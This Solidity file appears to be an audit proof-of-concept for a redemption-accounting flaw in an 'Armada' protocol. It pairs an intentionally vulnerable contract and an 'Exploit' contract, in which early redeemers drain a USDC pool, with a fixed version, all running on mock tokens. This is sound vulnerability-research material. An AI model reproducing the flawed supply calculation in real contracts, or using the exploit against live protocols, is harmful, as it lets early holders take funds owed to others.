// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Armada — ArmadaRedemption.circulatingSupply subtracts the entire
    RevenueLock balance, including ARM already entitled to a beneficiary
    who has not called release (Cyfrin, 2026-05). Early redeemers are paid
    against a 1.2M denominator instead of 3M. Alice and Bob each take
    250,000 USDC. Carol's 300,000 USDC fair share is gone.
    The control counts entitled-but-unclaimed ARM as circulating.
*/

contract Token {
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol, uint8 _decimals) {
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ArmadaRedemption {
    Token public arm;
    Token public usdc;
    address public treasury;
    address public revenueLock;
    address public crowdfund;
    uint256 public lastSupply;

    constructor(Token _arm, Token _usdc, address _treasury, address _revenueLock, address _crowdfund) {
        arm = _arm;
        usdc = _usdc;
        treasury = _treasury;
        revenueLock = _revenueLock;
        crowdfund = _crowdfund;
    }

    function circulatingSupply() public returns (uint256 supply) {
        // @> VULN: the full RevenueLock balance is subtracted, including ARM already entitled to a user who has not released
        supply = arm.totalSupply() - arm.balanceOf(treasury) - arm.balanceOf(revenueLock) - arm.balanceOf(crowdfund)
            - arm.balanceOf(address(this));
        lastSupply = supply;
    }

    function redeem(uint256 armAmount) external returns (uint256 payout) {
        uint256 supply = circulatingSupply();
        uint256 bal = usdc.balanceOf(address(this));
        payout = (bal * armAmount) / supply;
        require(payout > 0, "ArmadaRedemption: no assets available - call sweep first");
        arm.transferFrom(msg.sender, address(this), armAmount);
        usdc.transfer(msg.sender, payout);
    }
}

contract ArmadaRedemptionFixed {
    Token public arm;
    Token public usdc;
    address public treasury;
    address public revenueLock;
    address public crowdfund;
    uint256 public entitledUnclaimed;

    constructor(Token _arm, Token _usdc, address _treasury, address _revenueLock, address _crowdfund, uint256 entitled) {
        arm = _arm;
        usdc = _usdc;
        treasury = _treasury;
        revenueLock = _revenueLock;
        crowdfund = _crowdfund;
        entitledUnclaimed = entitled;
    }

    function circulatingSupply() public view returns (uint256) {
        uint256 lockExcluded = arm.balanceOf(revenueLock) - entitledUnclaimed;
        return arm.totalSupply() - arm.balanceOf(treasury) - lockExcluded - arm.balanceOf(crowdfund)
            - arm.balanceOf(address(this));
    }

    function noteReleased(uint256 amount) external {
        entitledUnclaimed -= amount;
    }

    function redeem(uint256 armAmount) external returns (uint256 payout) {
        uint256 supply = circulatingSupply();
        uint256 bal = usdc.balanceOf(address(this));
        payout = (bal * armAmount) / supply;
        require(payout > 0, "assets");
        arm.transferFrom(msg.sender, address(this), armAmount);
        usdc.transfer(msg.sender, payout);
    }
}

contract Holder {
    function push(Token t, address to, uint256 amount) external {
        t.transfer(to, amount);
    }
}

contract Carol {
    function redeem(ArmadaRedemption r, Token arm, uint256 amount) external returns (bool ok) {
        arm.approve(address(r), amount);
        try r.redeem(amount) returns (uint256) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function redeemFixed(ArmadaRedemptionFixed r, Token arm, uint256 amount) external returns (uint256 payout) {
        arm.approve(address(r), amount);
        payout = r.redeem(amount);
    }
}

contract Exploit {
    uint256 public constant TOTAL = 12_000_000 ether;
    uint256 public constant USDC_IN = 500_000e6;
    uint256 public constant ALICE_ARM = 600_000 ether;
    uint256 public constant BOB_ARM = 600_000 ether;
    uint256 public constant CAROL_ARM = 1_800_000 ether;
    address public constant TREASURY = address(uint160(0x7777));
    address public constant CROWDFUND = address(uint160(0xCF00));

    Token public arm;
    Token public usdc;
    ArmadaRedemption public redemption;
    Holder public revenueLock;
    Carol public carol;
    uint256 public alicePayout;
    uint256 public bobPayout;
    bool public carolPaid;

    constructor() {
        arm = new Token("ARM", 18);
        usdc = new Token("USDC", 6);
        revenueLock = new Holder();
        carol = new Carol();
        redemption = new ArmadaRedemption(arm, usdc, TREASURY, address(revenueLock), CROWDFUND);
        arm.mint(TREASURY, (TOTAL * 65) / 100);
        arm.mint(address(revenueLock), (TOTAL * 15) / 100);
        arm.mint(CROWDFUND, (TOTAL * 10) / 100);
        arm.mint(address(this), ALICE_ARM + BOB_ARM);
        usdc.mint(address(redemption), USDC_IN);
        arm.approve(address(redemption), type(uint256).max);
    }

    function run() external {
        uint256 supplyBefore = redemption.circulatingSupply();
        alicePayout = redemption.redeem(ALICE_ARM);
        bobPayout = redemption.redeem(BOB_ARM);
        uint256 left = usdc.balanceOf(address(redemption));
        revenueLock.push(arm, address(carol), CAROL_ARM);
        uint256 supplyAfter = redemption.circulatingSupply();
        carolPaid = carol.redeem(redemption, arm, CAROL_ARM);
        require(supplyBefore == 1_200_000 ether, "denom");
        require(alicePayout == 250_000e6, "alice");
        require(bobPayout == 250_000e6, "bob");
        require(left == 0, "drained");
        require(supplyAfter == CAROL_ARM, "after");
        require(!carolPaid, "carol");
        require(usdc.balanceOf(address(carol)) == 0, "carol bal");
        require(usdc.balanceOf(address(this)) == USDC_IN, "early");
    }
}
